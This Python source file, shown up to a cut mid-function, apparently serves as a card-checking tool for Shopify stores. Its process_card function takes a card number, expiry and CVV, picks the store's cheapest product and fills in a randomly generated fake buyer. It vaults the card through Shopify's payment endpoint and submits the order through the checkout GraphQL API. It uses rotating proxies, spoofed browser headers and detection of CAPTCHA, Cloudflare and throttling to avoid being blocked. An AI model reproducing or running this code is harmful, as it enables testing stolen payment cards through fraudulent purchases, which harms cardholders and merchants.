import asyncio
import aiohttp
import json
import re
import random
import html as html_module
import logging
import traceback
from urllib.parse import urlparse
from flask import Flask, request, jsonify
import os

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)

QUERY_PROPOSAL_SHIPPING = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken sellerProposal{runningTotal{value{amount currencyCode __typename}__typename}total{value{amount currencyCode __typename}__typename}delivery{__typename ...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{handle amount{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}}payment{__typename}tax{__typename ...on FilledTaxTerms{totalTaxAmount{value{amount currencyCode __typename}__typename}__typename}}__typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage __typename}}__typename}}"""

QUERY_PROPOSAL_DELIVERY = QUERY_PROPOSAL_SHIPPING

MUTATION_SUBMIT = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){__typename ...on SubmitSuccess{receipt{id __typename}__typename}...on SubmitAlreadyAccepted{receipt{id __typename}__typename}...on SubmittedForCompletion{receipt{id __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{code localizedMessage nonLocalizedMessage __typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}__typename}}"""

QUERY_POLL = """query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){__typename ...on ProcessedReceipt{id orderStatusPageUrl __typename}...on ProcessingReceipt{id pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{__typename ...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}__typename}__typename}__typename}}"""

logger.info(f"QUERY_PROPOSAL_SHIPPING: {len(QUERY_PROPOSAL_SHIPPING)} chars")
logger.info(f"MUTATION_SUBMIT: {len(MUTATION_SUBMIT)} chars")
logger.info(f"QUERY_POLL: {len(QUERY_POLL)} chars")

C2C = {"USD": "US", "CAD": "CA", "INR": "IN", "AED": "AE", "HKD": "HK", "GBP": "GB", "CHF": "CH"}

book = {
    "US": {"address1": "123 Main St", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
    "CA": {"address1": "88 Queen St", "city": "Toronto", "postalCode": "M5J2J3", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
    "GB": {"address1": "221B Baker Street", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "LND", "countryCode": "GB", "phone": "2079460123"},
    "IN": {"address1": "221B MG Road", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "+91 9876543210"},
    "AE": {"address1": "Burj Tower", "city": "Dubai", "postalCode": "00000", "zoneCode": "DU", "countryCode": "AE", "phone": "+971 50 123 4567"},
    "HK": {"address1": "Nathan 88", "city": "Kowloon", "postalCode": "999077", "zoneCode": "KL", "countryCode": "HK", "phone": "+852 5555 5555"},
    "CN": {"address1": "8 Zhongguancun Street", "city": "Beijing", "postalCode": "100080", "zoneCode": "BJ", "countryCode": "CN", "phone": "1062512345"},
    "CH": {"address1": "Gotthardstrasse 17", "city": "Schweiz", "postalCode": "6430", "zoneCode": "SZ", "countryCode": "CH", "phone": "445512345"},
    "AU": {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
    "DEFAULT": {"address1": "123 Main St", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
}

def pick_addr(url, cc=None, rc=None):
    cc = (cc or "").upper()
    rc = (rc or "").upper()
    try:
        dom = urlparse(url).netloc
        tcn = dom.split('.')[-1].upper()
    except Exception:
        tcn = ""
    if tcn in book:
        return book[tcn]
    ccn = C2C.get(cc)
    if rc in book and ccn == rc:
        return book[rc]
    elif rc in book:
        return book[rc]
    return book["DEFAULT"]

def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1 and end in parts[1]:
                result = parts[1].split(end, 1)[0]
                return result if result else None
        return None
    except Exception:
        return None

def safe_get(d, *keys, default=None):
    cur = d
    for k in keys:
        if not isinstance(cur, dict):
            return default
        cur = cur.get(k)
        if cur is None:
            return default
    return cur

class Utils:
    @staticmethod
    def get_random_name():
        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Mary", "Patricia", "Jennifer", "Linda"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez"]
        return (random.choice(first_names), random.choice(last_names))

    @staticmethod
    def generate_email(first, last):
        domains = ["gmail.com", "yahoo.com", "outlook.com", "protonmail.com"]
        return f"{first.lower()}.{last.lower()}{random.randint(1,999)}@{random.choice(domains)}"

def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    parts = proxy_str.split(':')
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    elif len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return None

def is_captcha_required(response_text):
    if not response_text:
        return False
    indicators = ['CAPTCHA_REQUIRED', '"code":"CAPTCHA_REQUIRED"', 'captcha required',
                  'CAPTCHA CHALLENGE', 'hcaptcha', 'h-captcha']
    text_upper = response_text.upper()
    return any(ind.upper() in text_upper for ind in indicators)

def detect_block_page(text):
    if not text:
        return None
    low = text.lower()
    if len(text) < 5000:
        if 'just a moment' in low or 'cf-chl' in low or 'cf_challenge' in low or 'checking your browser' in low:
            return "CLOUDFLARE_CHALLENGE"
        if 'opening soon' in low or 'storefront_password' in low or 'enter password' in low:
            return "PASSWORD_PROTECTED"
        if 'access denied' in low:
            return "ACCESS_DENIED"
    return None

async def make_graphql_request(session, graphql_url, params, headers, payload_dict, proxy, max_retries=1):
    try:
        body = json.dumps(payload_dict, ensure_ascii=False).encode('utf-8')
    except Exception as e:
        return None, f"Payload serialization failed: {e}"
    send_headers = {**headers, 'Content-Type': 'application/json; charset=utf-8'}
    for attempt in range(max_retries + 1):
        try:
            async with session.post(graphql_url, params=params, headers=send_headers,
                                    data=body, proxy=proxy) as response:
                text = await response.text()
                return response, text
        except Exception as e:
            logger.warning(f"GraphQL attempt {attempt+1} failed: {e}")
            if attempt == max_retries:
                return None, str(e)
            await asyncio.sleep(1)
    return None, "Max retries exceeded"

async def fetch_products(domain, proxy_str=None):
    try:
        if not domain.startswith('http'):
            domain = "https://" + domain
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=15)
        proxy = parse_proxy(proxy_str) if proxy_str else None
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            async with session.get(f"{domain}/products.json", proxy=proxy) as resp:
                if resp.status != 200:
                    return False, f"Site Error! Status: {resp.status}"
                text = await resp.text()
                if "shopify" not in text.lower():
                    return False, "Not Shopify!"
                data = await resp.json()
                result = data.get('products', [])
                if not result:
                    return False, "No Products!"
        min_price = float('inf')
        min_product = None
        for product in result:
            for variant in product.get('variants', []):
                if not variant.get('available', True):
                    continue
                try:
                    price = float(str(variant.get('price', '0')).replace(',', ''))
                    if price < min_price:
                        min_price = price
                        min_product = {
                            'site': domain, 'price': f"{price:.2f}",
                            'variant_id': str(variant['id']),
                            'link': f"{domain}/products/{product['handle']}"}
                except (ValueError, TypeError, AttributeError):
                    continue
        if min_product:
            return min_product
        return False, "No Valid Products"
    except aiohttp.ClientError as e:
        return False, f"Proxy Error: {str(e)}"
    except Exception as e:
        return False, f"error: {str(e)}"

def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    message = str(message)
    patterns = [
        r'(PAYMENTS_[A-Z_]+)', r'(CARD_[A-Z_]+)',
        r'([A-Z]+_[A-Z]+_[A-Z_]+)', r'([A-Z]+_[A-Z_]+)',
        r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?',
        r'{"code":"([^"]+)"', r"'code':'([^']+)'"
    ]
    for pattern in patterns:
        matches = re.findall(pattern, message, re.IGNORECASE)
        for match in matches:
            if isinstance(match, tuple):
                match = match[0]
            if match and "_" in match and len(match) < 60:
                return match.strip("{}:'\" ")
    words = message.split()
    if words and "_" in words[0] and words[0].isupper():
        return words[0]
    return message[:80]

def extract_session_token(response_obj, text, unescaped, checkout_url):
    for hdr in ['X-Checkout-One-Session-Token', 'x-checkout-one-session-token',
                'X-Shopify-Checkout-Session-Token', 'x-shopify-checkout-session-token',
                'shopify-checkout-session-token']:
        val = response_obj.headers.get(hdr)
        if val and len(val) > 10:
            return val.strip()
    token_patterns = [
        r'"serializedSessionToken"\s*:\s*"([^"]{20,})"',
        r'"sessionToken"\s*:\s*"([^"]{20,})"',
        r'"checkoutSessionToken"\s*:\s*"([^"]{20,})"',
        r'session[-_]?[Tt]oken["\']?\s*:\s*["\']([^"\']{20,})["\']',
        r'"token"\s*:\s*"([a-zA-Z0-9_\-\.]{30,})"',
        r'serialized-sessionToken["\s]+content=["\']([^"\']{20,})["\']',
        r'data-session-token=["\']([^"\']{20,})["\']',
        r'data-checkout-session-token=["\']([^"\']{20,})["\']',
        r'"checkoutToken"\s*:\s*"([^"]{20,})"',
        r'window\.__checkout\s*=\s*\{[^}]*"sessionToken"\s*:\s*"([^"]{20,})"',
    ]
    for src in (text, unescaped):
        for pat in token_patterns:
            m = re.search(pat, src)
            if m:
                tok = m.group(1).strip()
                if len(tok) >= 20 and not re.fullmatch(r'[0-9a-f]{40}', tok):
                    return tok
    m = re.search(r'<meta\s+name=["\']shopify-checkout-session-token["\'][^>]*content=["\']([^"\']+)["\']',
                  unescaped, re.IGNORECASE)
    if m:
        return m.group(1).strip()
    m = re.search(r'/checkouts/(?:cn/)?([a-zA-Z0-9_\-]{20,})', checkout_url)
    if m:
        candidate = m.group(1)
        if not candidate.isdigit():
            return candidate
    return None

def safe_parse_json(text, label=""):
    if not text:
        return None, f"Empty response body ({label})"
    try:
        parsed = json.loads(text)
        if not isinstance(parsed, dict):
            return None, f"Non-dict JSON: {type(parsed).__name__} ({label})"
        return parsed, None
    except json.JSONDecodeError as e:
        return None, f"Invalid JSON ({label}): {e} — body: {text[:120].replace(chr(10), ' ')}"

async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
    gateway = "UNKNOWN"
    total_price = "0.00"
    currency = "USD"
    ourl = site_url if site_url.startswith('http') else f'https://{site_url}'
    proxy = parse_proxy(proxy_str) if proxy_str else None
    checkpoint_data = None
    running_total = "0.00"
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Content-Type': 'application/json',
            'Origin': ourl, 'Referer': ourl,
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
            'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"'
        }
        address_info = pick_addr(ourl)
        country_code = address_info["countryCode"]
        firstName, lastName = Utils.get_random_name()
        email = Utils.generate_email(firstName, lastName)
        phone = address_info["phone"]
        street = address_info["address1"]
        city = address_info["city"]
        state = address_info["zoneCode"]
        s_zip = address_info["postalCode"]
        address2 = ""
        if not variant_id:
            info = await fetch_products(ourl, proxy_str)
            if isinstance(info, tuple):
                return False, info[1], gateway, total_price, currency
            if not info or not isinstance(info, dict):
                return False, 'No valid product found', gateway, total_price, currency
            variant_id = info['variant_id']
            if total_price == '0.00':
                total_price = str(info.get('price', '0.00'))
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=45)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            url = ourl
            cart = url + '/cart/add.js'
            checkout = url + '/checkout/'
            cart_headers = {**headers, 'Content-Type': 'application/x-www-form-urlencoded',
                            'Accept': 'application/json, text/javascript'}
            try:
                cart_resp = await session.post(cart, data=f'id={variant_id}&quantity=1',
                                               headers=cart_headers, proxy=proxy)
            except Exception as e:
                return False, f"Cart request failed: {str(e)[:80]}", gateway, total_price, currency
            if cart_resp.status != 200:
                cart_data = {'items': [{'id': int(variant_id), 'quantity': 1}]}
                cart_headers_alt = {**headers, 'Content-Type': 'application/json', 'Accept': 'application/json'}
                cart_resp = await session.post(cart, json=cart_data, headers=cart_headers_alt, proxy=proxy)
            if cart_resp.status != 200:
                cart_text = await cart_resp.text()
                return False, f"Cart failed ({cart_resp.status}): {cart_text[:100]}", gateway, total_price, currency
            checkout_headers = {**headers,
                                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                                'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate',
                                'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1'}
            try:
                response = await session.post(url=checkout, allow_redirects=True,
                                              headers=checkout_headers, proxy=proxy)
            except Exception as e:
                return False, f"Checkout request failed: {str(e)[:80]}", gateway, total_price, currency
            checkout_url = str(response.url)
            if 'login' in checkout_url.lower():
                return False, "Site requires login!", gateway, total_price, currency
            text = await response.text()
            if not text or len(text) < 200:
                return False, f"Empty checkout page ({len(text)} bytes)", gateway, total_price, currency
            block = detect_block_page(text)
            if block:
                return False, block, gateway, total_price, currency
            unescaped = html_module.unescape(text)
            attempt_token = None
            m = re.search(r'/checkouts/(?:cn/)?([^/?#\s]{8,})', checkout_url)
            if m:
                candidate = m.group(1).split('?')[0].split('#')[0]
                if len(candidate) >= 8:
                    attempt_token = candidate
            if not attempt_token:
                m = re.search(r'"attemptToken"\s*:\s*"([^"]{8,})"', unescaped)
                if m:
                    attempt_token = m.group(1)
            if not attempt_token or len(attempt_token) < 8:
                return False, "Failed to extract attempt token", gateway, total_price, currency
            sst = extract_session_token(response, text, unescaped, checkout_url)
            if not sst:
                return False, "Failed to get session token", gateway, total_price, currency
            queueToken = (extract_between(unescaped, '"queueToken":"', '"') or "")
            stableId = (extract_between(unescaped, '"stableId":"', '"') or
                        extract_between(unescaped, 'stableId":"', '"') or "1")
            merch = None
            for pat in [r'ProductVariantMerchandise/(\d+)',
                        r'"merchandiseId":"gid://shopify/ProductVariantMerchandise/(\d+)"']:
                m = re.search(pat, unescaped)
                if m:
                    merch = m.group(1)
                    break
            if not merch:
                merch = str(variant_id)
            currency = "USD"
            for pat in [r'"currencyCode":"([A-Z]{3})"', r'currencyCode":"([A-Z]{3})"']:
                m = re.search(pat, unescaped)
                if m:
                    currency = m.group(1)
                    break
            subtotal = None
            for pat in [r'"subtotalBeforeTaxesAndShipping":\{"value":\{"amount":"([\d.]+)"',
                        r'subtotalBeforeTaxesAndShipping":{"value":{"amount":"([\d.]+)"']:
                m = re.search(pat, unescaped)
                if m:
                    subtotal = m.group(1)
                    break
            if not subtotal:
                m = re.search(r'"price":\s*"([\d.]+)"', unescaped)
                subtotal = m.group(1) if m else "0.01"
            build_id = None
            m = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
            if m:
                build_id = m.group(1)
            source_token = extract_between(text, 'name="serialized-sourceToken" content="', '"')
            if source_token:
                source_token = source_token.replace('&quot;', '').strip('"')
            ident_sig = None
            m = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped)
            if m:
                ident_sig = m.group(1)
            headers.update({
                'shopify-checkout-client': 'checkout-web/1.0',
                'shopify-checkout-source': f'id="{attempt_token}", type="cn"',
                'x-checkout-one-session-token': sst,
                'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin',
            })
            if build_id:
                headers['x-checkout-web-build-id'] = build_id
                headers['x-checkout-web-deploy-stage'] = 'production'
                headers['x-checkout-web-server-handling'] = 'fast'
                headers['x-checkout-web-server-rendering'] = 'yes'
            if source_token:
                headers['x-checkout-web-source-id'] = source_token
            params = {'operationName': 'Proposal'}
            graphql_url = f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'
            proposal_vars = {
                'sessionInput': {'sessionToken': sst},
                'queueToken': queueToken,
                'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                'delivery': {
                    'deliveryLines': [{
                        'destination': {'partialStreetAddress': {
                            'address1': street, 'address2': address2, 'city': city,
                            'countryCode': country_code, 'postalCode': s_zip,
                            'firstName': firstName, 'lastName': lastName,
                            'zoneCode': state, 'phone': phone}},
                        'selectedDeliveryStrategy': {
                            'deliveryStrategyMatchingConditions': {
                                'estimatedTimeInTransit': {'any': True},
                                'shipments': {'any': True}},
                            'options': {}},
                        'targetMerchandiseLines': {'any': True},
                        'deliveryMethodTypes': ['SHIPPING'],
                        'expectedTotalPrice': {'any': True},
                        'destinationChanged': True
                    }],
                    'noDeliveryRequired': [], 'useProgressiveRates': False,
                    'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True
                },
                'deliveryExpectations': {'deliveryExpectationLines': []},
                'merchandise': {'merchandiseLines': [{
                    'stableId': stableId,
                    'merchandise': {'productVariantReference': {
                        'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                        'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                        'properties': [], 'sellingPlanId': None, 'sellingPlanDigest': None}},
                    'quantity': {'items': {'value': 1}},
                    'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
                    'lineComponentsSource': None, 'lineComponents': []}]},
                'payment': {'totalAmount': {'any': True}, 'paymentLines': [],
                            'billingAddress': {'streetAddress': {
                                'address1': '', 'city': '', 'countryCode': country_code,
                                'lastName': '', 'zoneCode': 'ENG', 'phone': ''}}},
                'buyerIdentity': {
                    'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                    'email': email, 'emailChanged': False, 'phoneCountryCode': country_code,
                    'marketingConsent': [{'email': {'value': email}}],
                    'shopPayOptInPhone': {'countryCode': country_code}, 'rememberMe': False},
                'tip': {'tipLines': []},
                'taxes': {'proposedAllocations': None,
                          'proposedTotalAmount': {'value': {'amount': '0', 'currencyCode': currency}},
                          'proposedTotalIncludedAmount': None,
                          'proposedMixedStateTotalAmount': None, 'proposedExemptions': []},
                'note': {'message': None, 'customAttributes': []},
                'localizationExtension': {'fields': []},
                'nonNegotiableTerms': None,
                'scriptFingerprint': {'signature': None, 'signatureUuid': None,
                                      'lineItemScriptChanges': [], 'paymentScriptChanges': [],
                                      'shippingScriptChanges': []},
                'optionalDuties': {'buyerRefusesDuties': False}
            }
            json_data = {'query': QUERY_PROPOSAL_SHIPPING, 'operationName': 'Proposal',
                         'variables': proposal_vars}
            response, resp_text = await make_graphql_request(session, graphql_url, params, headers, json_data, proxy)
            await asyncio.sleep(2)
            if not resp_text:
                return False, "Empty GraphQL response (shipping)", gateway, total_price, currency
            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency
            resp_json, parse_err = safe_parse_json(resp_text, "shipping")
            if parse_err:
                return False, parse_err, gateway, total_price, currency
            if resp_json.get('errors'):
                errs = resp_json['errors']
                msgs = [e.get('message', str(e)) for e in errs[:3] if isinstance(e, dict)]
                return False, f"GraphQL Error: {'; '.join(msgs)[:150]}", gateway, total_price, currency
            data = resp_json.get('data')
            if not isinstance(data, dict):
                return False, "No data in proposal response", gateway, total_price, currency
            negotiate = safe_get(data, 'session', 'negotiate')
            if not isinstance(negotiate, dict):
                return False, "Negotiate is null", gateway, total_price, currency
            result = negotiate.get('result')
            if not isinstance(result, dict):
                return False, "Result is null", gateway, total_price, currency
            result_type = result.get('__typename', 'Unknown')
            if result_type == 'CheckpointDenied':
                return False, "Checkpoint Denied", gateway, total_price, currency
            if result_type == 'Throttled':
                return False, "Throttled - change proxy", gateway, total_price, currency
            if result_type == 'NegotiationResultFailed':
                return False, "Negotiation failed", gateway, total_price, currency
            checkpoint_data = result.get('checkpointData')
            seller_proposal = result.get('sellerProposal')
            if not isinstance(seller_proposal, dict):
                return False, "Seller proposal is null", gateway, total_price, currency
            running_total_data = seller_proposal.get('runningTotal')
            if isinstance(running_total_data, dict):
                running_total = safe_get(running_total_data, 'value', 'amount', default="0.00")
            else:
                total_data = seller_proposal.get('total')
                running_total = safe_get(total_data, 'value', 'amount', default="0.01") if isinstance(total_data, dict) else "0.01"
            delivery_data = seller_proposal.get('delivery')
            delivery_strategy = ''
            shipping_amount = 0.0
            if isinstance(delivery_data, dict) and delivery_data.get('__typename') == 'FilledDeliveryTerms':
                dl = delivery_data.get('deliveryLines') or []
                if dl and isinstance(dl[0], dict):
                    avail = dl[0].get('availableDeliveryStrategies') or []
                    if avail and isinstance(avail[0], dict):
                        delivery_strategy = avail[0].get('handle', '')
                        shipping_amount = float(safe_get(avail[0], 'amount', 'value', 'amount', default="0") or 0)
            tax_amount = 0.0
            tax_data = seller_proposal.get('tax')
            if isinstance(tax_data, dict) and tax_data.get('__typename') == 'FilledTaxTerms':
                tax_amount = float(safe_get(tax_data, 'totalTaxAmount', 'value', 'amount', default="0") or 0)
            payment_identifier = "shopify_payments"
            gateway = "Shopify Payments"
            total_price = str(round(float(running_total) + shipping_amount + tax_amount, 2))
            dl0 = json_data['variables']['delivery']['deliveryLines'][0]
            dl0['selectedDeliveryStrategy'] = {
                'deliveryStrategyByHandle': {'handle': delivery_strategy, 'customDeliveryRate': False},
                'options': {}}
            dl0['targetMerchandiseLines'] = {'lines': [{'stableId': stableId}]}
            dl0['expectedTotalPrice'] = {'value': {'amount': str(shipping_amount), 'currencyCode': currency}}
            dl0['destinationChanged'] = False
            json_data['variables']['payment']['billingAddress'] = {
                'streetAddress': {
                    'address1': street, 'address2': address2, 'city': city,
                    'countryCode': country_code, 'postalCode': s_zip,
                    'firstName': firstName, 'lastName': lastName,
                    'zoneCode': state, 'phone': phone}}
            json_data['variables']['taxes']['proposedTotalAmount']['value']['amount'] = str(tax_amount)
            json_data['variables']['buyerIdentity']['shopPayOptInPhone']['number'] = phone
            json_data['query'] = QUERY_PROPOSAL_DELIVERY
            response, resp_text2 = await make_graphql_request(session, graphql_url, params, headers, json_data, proxy)
            if is_captcha_required(resp_text2 or ""):
                return False, "CAPTCHA_REQUIRED (delivery)", gateway, total_price, currency
            vault_payload = {
                "credit_card": {
                    "number": cc, "month": int(mes), "year": int(ano),
                    "verification_value": cvv, "start_month": None, "start_year": None,
                    "issue_number": "", "name": f"{firstName} {lastName}"},
                "payment_session_scope": urlparse(url).netloc
            }
            vault_headers = {
                'Content-Type': 'application/json', 'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.9',
                'Origin': 'https://checkout.pci.shopifyinc.com',
                'Referer': 'https://checkout.pci.shopifyinc.com/',
                'User-Agent': headers['User-Agent'],
                'sec-ch-ua': headers['sec-ch-ua'],
                'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin', 'sec-fetch-storage-access': 'active'
            }
            if ident_sig:
                vault_headers['shopify-identification-signature'] = ident_sig
            try:
                vault_body = json.dumps(vault_payload, ensure_ascii=False).encode('utf-8')
                async with session.post('https://checkout.pci.shopifyinc.com/sessions',
                                        data=vault_body, headers=vault_headers, proxy=proxy) as vr:
                    vault_text = await vr.text()
                token_data, vault_err = safe_parse_json(vault_text, "vault")
                if vault_err or not isinstance(token_data, dict):
                    return False, f"Vault parse error: {vault_err}", gateway, total_price, currency
                token = token_data.get('id')
                if not token:
                    return False, f"No vault token: {str(token_data)[:100]}", gateway, total_price, currency
            except Exception as e:
                return False, f"Vault failed: {str(e)[:80]}", gateway, total_price, currency
            submit_variables = {
                'input': {
                    'sessionInput': {'sessionToken': sst},
                    'queueToken': queueToken,
                    'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                    'delivery': {
                        'deliveryLines': [{
                            'destination': {'streetAddress': {
                                'address1': street, 'address2': address2, 'city': city,
                                'countryCode': country_code, 'postalCode': s_zip,
                                'firstName': firstName, 'lastName': lastName,
                                'zoneCode': state, 'phone': phone}},
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyByHandle': {'handle': delivery_strategy, 'customDeliveryRate': False},
                                'options': {'phone': phone}},
                            'targetMerchandiseLines': {'lines': [{'stableId': stableId}]},
                            'deliveryMethodTypes': ['SHIPPING'],
                            'expectedTotalPrice': {'value': {'amount': str(shipping_amount), 'currencyCode': currency}},
                            'destinationChanged': False
                        }],
                        'noDeliveryRequired': [], 'useProgressiveRates': True,
                        'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True
                    },
                    'merchandise': {'merchandiseLines': [{
                        'stableId': stableId,
                        'merchandise': {'productVariantReference': {
                            'id': f'gid://shopify/ProductVariantMerchandise/{merch}',
                            'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                            'properties': [], 'sellingPlanId': None, 'sellingPlanDigest': None}},
                        'quantity': {'items': {'value': 1}},
                        'expectedTotalPrice': {'value': {'amount': subtotal, 'currencyCode': currency}},
                        'lineComponentsSource': None, 'lineComponents': []}]},
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [{
                            'paymentMethod': {'directPaymentMethod': {
                                'paymentMethodIdentifier': payment_identifier,
                                'sessionId': token,
                                'billingAddress': {'streetAddress': {
                                    'address1': street, 'address2': address2, 'city': city,
                                    'countryCode': country_code, 'postalCode': s_zip,
                                    'firstName': firstName, 'lastName': lastName,
                                    'zoneCode': state, 'phone': phone}},
                                'cardSource': None}},
                            'amount': {'value': {'amount': running_total, 'currencyCode': currency}},
                            'dueAt': None}],
                        'billingAddress': {'streetAddress': {
                            'address1': street, 'address2': address2, 'city': city,
                            'countryCode': country_code, 'postalCode': s_zip,
                            'firstName': firstName, 'lastName': lastName,
                            'zoneCode': state, 'phone': phone}}},
                    'buyerIdentity': {
                        'customer': {'presentmentCurrency': currency, 'countryCode': country_code},
                        'email': email, 'emailChanged': False, 'phoneCountryCode': country_code,
                        'marketingConsent': [{'email': {'value': email}}],
                        'shopPayOptInPhone': {'number': phone, 'countryCode': country_code},
                        'rememberMe': False},
                    'taxes': {'proposedAllocations': None,
                              'proposedTotalAmount': {'value': {'amount': str(tax_amount), 'currencyCode': currency}},
                              'proposedTotalIncludedAmount': None,
                              'proposedMixedStateTotalAmount': None, 'proposedExemptions': []},
                    'tip': {'tipLines': []},
                    'note': {'message': None, 'customAttributes': []},
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'optionalDuties': {'buyerRefusesDuties': False}
                },
                'attemptToken': attempt_token,
                'metafields': [],
                'analytics': {'requestUrl': checkout_url}
            }
            if checkpoint_data:
                submit_variables['input']['checkpointData'] = checkpoint_data
            submit_payload = {'query': MUTATION_SUBMIT, 'variables': submit_variables,
                              'operationName': 'SubmitForCompletion'}
            submit_params = {'operationName': 'SubmitForCompletion'}
            response, submit_text = await make_graphql_request(
                session, graphql_url, submit_params, headers, submit_payload, proxy)
            if is_captcha_required(submit_text or ""):
                return False, "CAPTCHA_REQUIRED (submit)", gateway, total_price, currency
            if submit_text and "Your order total has changed." in submit_text:
                return False, "Site not supported (total changed)", gateway, total_price, currency
            if submit_text and "The requested payment method is not available." in submit_text:
                return False, "Payment method not available", gateway, total_price, currency
            sub_json, sub_err = safe_parse_json(submit_text, "submit")
            if sub_err:
                return False, sub_err, gateway, total_price, currency
            if sub_json.get('errors'):
                for err in sub_json['errors']:
                    if isinstance(err, dict):
                        code = err.get('code') or err.get('message')
                        if code:
